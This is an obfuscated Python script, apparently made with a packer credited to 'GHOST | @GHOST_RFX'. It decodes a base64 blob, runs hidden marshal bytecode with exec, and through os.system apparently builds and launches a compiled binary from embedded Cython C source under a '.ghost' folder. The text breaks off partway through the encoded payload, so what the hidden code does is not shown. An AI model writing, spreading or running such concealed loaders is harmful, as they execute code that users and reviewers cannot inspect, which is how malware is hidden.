# THIS ENCODE BY GHOST | @GHOST_RFX â™¤
G,H,O,S,T,J,I,I = map(chr, [71, 72, 79, 83, 84, 74, 73, 73])
GH, OS, TJ, II = G+H, O+S, T+J, I+I
GHOST = G+H+O+S+T+J+I+I
import tempfile as t
from os import path as ghost_path, remove as grdmv, system as stem
from base64 import b64decode as lmao
ghostenc = (b'aW1wb3J0IG1hcnNoYWwKZXhlYyhtYXJzaGFsLmxvYWRzKGInXHhlM1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDhceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhmM1x4MDhceDA0XHgwMFx4MDBceDk3XHgwMFx4MDJceDAwZVx4MDBlXHgwMWdceDAwZFx4MDBceGEyXHgwMVx4YTZceDAyXHgwMFx4MDBceGFiXHgwMlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXFxceDA4XHgwMFx4MDBaXHgwMlpceDAzWlx4MDRaXHgwNVpceDA2Wlx4MDdaXHgwOFpceDA4ZVx4MDJlXHgwM3pceDAwXHgwMFx4MDBlXHgwNGVceDA1elx4MDBceDAwXHgwMGVceDA2ZVx4MDd6XHgwMFx4MDBceDAwZVx4MDhlXHgwOHpceDAwXHgwMFx4MDBmXHgwNFxcXHgwNFx4MDBceDAwWlx0WlxuWlx4MGJaXHgwY2VceDAyZVx4MDN6XHgwMFx4MDBceDAwZVx4MDR6XHgwMFx4MDBceDAwZVx4MDV6XHgwMFx4MDBceDAwZVx4MDZ6XHgwMFx4MDBceDAwZVx4MDd6XHgwMFx4MDBceDAwZVx4MDh6XHgwMFx4MDBceDAwZVx4MDh6XHgwMFx4MDBceDAwWlxyZFx4MDFkXHgwMmxceDBlWlx4MGZkXHgwMWRceDAzbFx4MTBtXHgxMVpceDEybVx4MTNaXHgxNG1ceDE1Wlx4MTZceDAxXHgwMGRceDAxZFx4MDRsXHgxN21ceDE4Wlx4MTlceDAxXHgwMFx4MDJceDAwZVx4MWFkXHgwNVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGVceDFhZFx4MDZceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMlx4MDBlXHgxYWRceDA3XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMFx4MDJceDAwZVx4MWFkXHgwNlx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGVceDFiZFx4MDhceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGpceDFjXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBaXHgxZGRcdFpceDFlZFxuXHgwMlx4MDBlXHgxYmRceDA4XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBqXHgxY1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwelx4MDBceDAwXHgwMFpceDFmZFx4MGJceDAyXHgwMGVceDFiZFx4MDhceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGogXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDB6XHgwMFx4MDBceDAwWiFkXHgwY2VceDFlelx4MDBceDAwXHgwMFoiXHgwMlx4MDBlXHgxMmojXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBlXHgxZVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwciJceDAyXHgwMGVceDE2ZVx4MWZkXHJ6XHgwMFx4MDBceDAwZSF6XHgwMFx4MDBceDAwZFxyelx4MDBceDAwXHgwMGUielx4MDBceDAwXHgwMFx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBceDAyXHgwMGUkZFx4MDFceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwZFx4MGVaJWRceDBmWiZkXHgxMFx4YTBcJ1x4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMlx4MDBlXHgxYmRceDA4XHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBqKFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhhMClceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDExXHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBkXHgwMVx4MTlceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceGEwKVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZFx4MTBceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDAyZFx4MTJceDg1XHgwMlx4MTlceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFoqZFx4MTNlXHgxZHpceDAwXHgwMFx4MDBkXHgxNHpceDAwXHgwMFx4MDBlKnpceDAwXHgwMFx4MDBkXHgxNXpceDAwXHgwMFx4MDBlXHgxZXpceDAwXHgwMFx4MDBkXHgxMXpceDAwXHgwMFx4MDBlJnpceDAwXHgwMFx4MDBkXHgxNnpceDAwXHgwMFx4MDBlXHgxZHpceDAwXHgwMFx4MDBkXHgxN3pceDAwXHgwMFx4MDBlKnpceDAwXHgwMFx4MDBaK1x4MDJceDAwZSxlJmRceDE4XHhhNlx4MDJceDAwXHgwMFx4YWJceDAyXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDA1XHgwMFotZS1ceGEwLlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZSVceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwZFx4MDJkXHgwMmRceDAyXHhhNlx4MDJceDAwXHgwMFx4YWJceDAyXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMG5ceDBiI1x4MDAxXHgwMHNceDA0d1x4MDJ4XHgwM1lceDAwd1x4MDFceDAxXHgwMFlceDAwXHgwMVx4MDBceDAxXHgwMFx4MDJceDAwZVx4MWJkXHgxOVx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHhhMC9ceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwZVx4MTJqMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwZVx4MWVceGE2XHgwMVx4MDBceDAwXHhhYlx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMGRceDFhXHhhY1x4MWJceGE2XHgwMlx4MDBceDAwXHhhYlx4MDJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMlx4MDBlXHgxNmVceDFmZFxyelx4MDBceDAwXHgwMGUhelx4MDBceDAwXHgwMGRccnpceDAwXHgwMFx4MDBlK3pceDAwXHgwMFx4MDBkXHJ6XHgwMFx4MDBceDAwZSJ6XHgwMFx4MDBceDAwXHhhNlx4MDFceDAwXHgwMFx4YWJceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAxXHgwMFx4MDJceDAwZVx4MTRlJlx4YTZceDAxXHgwMFx4MDBceGFiXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMVx4MDBkXHgwMlNceDAwKVx4MWMpXHgwOFx4ZTlHXHgwMFx4MDBceDAwXHhlOUhceDAwXHgwMFx4MDBceGU5T1x4MDBceDAwXHgwMFx4ZTlTXHgwMFx4MDBceDAwXHhlOVRceDAwXHgwMFx4MDBceGU5Slx4MDBceDAwXHgwMFx4ZTlJXHgwMFx4MDBceDAwclx4MDhceDAwXHgwMFx4MDBceGU5XHgwMFx4MDBceDAwXHgwME4pXHgwM1x4ZGFceDA0cGF0aFx4ZGFceDA2cmVtb3ZlXHhkYVx4MDZzeXN0ZW0pXHgwMVx4ZGFcdGI2NGRlY29kZXUhXHgwMFx4MDBceDAwXHgxYlsxOzkybVx4MWJbMzg7NTs0Nm1MT0FESU5HXHhlMlx4ODBceGEyXHhlMlx4ODBceGEyXHhlMlx4ODBceGEyXHhkYVx4MDB1PVx4MDBceDAwXHgwMFx4MWJbMTs5Mm1ceDFiWzM4OzU7NTBtIyMjI1RISVMgSVMgRU5DT0RFRCBCWSAjR0hPU1QgXHhlMlx4ODBceGEyIEBHSE9TVF9SRlhceGRhXHgwM3N5c3pcdC5naG9zdC9qcXpceDEyZXhwb3J0IFBZVEhPTkhPTUU9elx4MTlleHBvcnQgUFlUSE9OX0VYRUNVVEFCTEU9elx4MDIuL3pceDAyJiZhJVx4Yzdcclx4MDBcblxuI2lmbmRlZiBQWV9TU0laRV9UX0NMRUFOXG4jZGVmaW5lIFBZX1NTSVpFX1RfQ0xFQU5cbiNlbmRpZiBcblxuI2lmIGRlZmluZWQoUHlfTElNSVRFRF9BUEkpXG4gICNpZiAhZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpXG4gICNkZWZpbmUgQ1lUSE9OX0xJTUlURURfQVBJIDFcbiAgI2VuZGlmXG4jZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSlcbiAgI2lmZGVmIF9NU0NfVkVSXG4gICNwcmFnbWEgbWVzc2FnZSAoIkxpbWl0ZWQgQVBJIHVzYWdlIGlzIGVuYWJsZWQgd2l0aCBcJ0NZVEhPTl9MSU1JVEVEX0FQSVwnIGJ1dCBcJ1B5X0xJTUlURURfQVBJXCcgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nIFwnUHlfTElNSVRFRF9BUElcJyBpbnN0ZWFkLiIpXG4gICNlbHNlXG4gICN3YXJuaW5nIExpbWl0ZWQgQVBJIHVzYWdlIGlzIGVuYWJsZWQgd2l0aCBcJ0NZVEhPTl9MSU1JVEVEX0FQSVwnIGJ1dCBcJ1B5X0xJTUlURURfQVBJXCcgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nIFwnUHlfTElNSVRFRF9BUElcJyBpbnN0ZWFkLlxuICAjZW5kaWZcbiNlbmRpZlxuXG4jaW5jbHVkZSAiUHl0aG9uLmgiXG4jaWZuZGVmIFB5X1BZVEhPTl9IXG4gICAgI2Vycm9yIFB5dGhvbiBoZWFkZXJzIG5lZWRlZCB0byBjb21waWxlIEMgZXh0ZW5zaW9ucywgcGxlYXNlIGluc3RhbGwgZGV2ZWxvcG1lbnQgdmVyc2lvbiBvZiBQeXRob24uXG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwMDBcbiAgICAjZXJyb3IgQ3l0aG9uIHJlcXVpcmVzIFB5dGhvbiAzLjgrLlxuI2Vsc2VcbiNkZWZpbmUgX19QWVhfQUJJX1ZFUlNJT04gIjNfMV81IlxuI2RlZmluZSBDWVRIT05fSEVYX1ZFUlNJT04gMHgwMzAxMDVGMFxuI2RlZmluZSBDWVRIT05fRlVUVVJFX0RJVklTSU9OIDFcblxuI2luY2x1ZGUgPHN0ZGRlZi5oPlxuI2lmbmRlZiBvZmZzZXRvZlxuICAjZGVmaW5lIG9mZnNldG9mKHR5cGUsIG1lbWJlcikgKCAoc2l6ZV90KSAmICgodHlwZSopMCkgLT4gbWVtYmVyIClcbiNlbmRpZlxuI2lmICFkZWZpbmVkKF9XSU4zMikgJiYgIWRlZmluZWQoV0lOMzIpICYmICFkZWZpbmVkKE1TX1dJTkRPV1MpXG4gICNpZm5kZWYgX19zdGRjYWxsXG4gICAgI2RlZmluZSBfX3N0ZGNhbGxcbiAgI2VuZGlmXG4gICNpZm5kZWYgX19jZGVjbFxuICAgICNkZWZpbmUgX19jZGVjbFxuICAjZW5kaWZcbiAgI2lmbmRlZiBfX2Zhc3RjYWxsXG4gICAgI2RlZmluZSBfX2Zhc3RjYWxsXG4gICNlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIERMX0lNUE9SVFxuICAjZGVmaW5lIERMX0lNUE9SVCh0KSB0XG4jZW5kaWZcbiNpZm5kZWYgRExfRVhQT1JUXG4gICNkZWZpbmUgRExfRVhQT1JUKHQpIHRcbiNlbmRpZlxuI2RlZmluZSBfX1BZWF9DT01NQSAsXG4jaWZuZGVmIEhBVkVfTE9OR19MT05HXG4gICNkZWZpbmUgSEFWRV9MT05HX0xPTkdcbiNlbmRpZlxuI2lmbmRlZiBQWV9MT05HX0xPTkdcbiAgI2RlZmluZSBQWV9MT05HX0xPTkcgTE9OR19MT05HXG4jZW5kaWZcbiNpZm5kZWYgUHlfSFVHRV9WQUxcbiAgI2RlZmluZSBQeV9IVUdFX1ZBTCBIVUdFX1ZBTFxuI2VuZGlmXG4jZGVmaW5lIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggUFlfVkVSU0lPTl9IRVhcbiNpZiBkZWZpbmVkKEdSQUFMVk1fUFlUSE9OKVxuICBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAxXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVBcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwXG4gICN1bmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDFcbiAgI3VuZGVmIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDFcbiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDBcbiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMFxuICAjdW5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9HSUxcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMFxuICAjdW5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9QWUNBTEwgMFxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTU1xuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDFcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMVxuICAjdW5kZWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklORyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRSAwXG4gICN1bmRlZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDFcbiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DXG4gICAgI2RlZmluZSBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DIDBcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRlJFRUxJU1RTIDBcbiNlbGlmIGRlZmluZWQoUFlQWV9WRVJTSU9OKVxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAxXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMVxuICAjaWZuZGVmIENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDBcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVBcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwXG4gICN1bmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDFcbiAgI3VuZGVmIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDFcbiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDBcbiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAwXG4gICN1bmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDBcbiAgI3VuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfUFlDQUxMXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDBcbiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1NcbiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUyAxXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG4gICAgI3VuZGVmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUKVxuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDFcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAjZGVmaW5lIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkdcbiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDBcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIChQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzBDMDApXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDBcbiAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAwXG4gICNpZm5kZWYgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQ1xuICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAoUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMxMTAwKVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMFxuI2VsaWYgZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpXG4gICNpZmRlZiBQeV9MSU1JVEVEX0FQSVxuICAgICN1bmRlZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYXG4gICAgI2RlZmluZSBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIFB5X0xJTUlURURfQVBJXG4gICNlbmRpZlxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDFcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwXG4gICN1bmRlZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLXG4gICNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDFcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUFxuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwXG4gICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFNcbiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMFxuICAjaWZuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwXG4gICNpZm5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDBcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAwXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjZGVmaW5lIENZVEhPTl9BU1NVT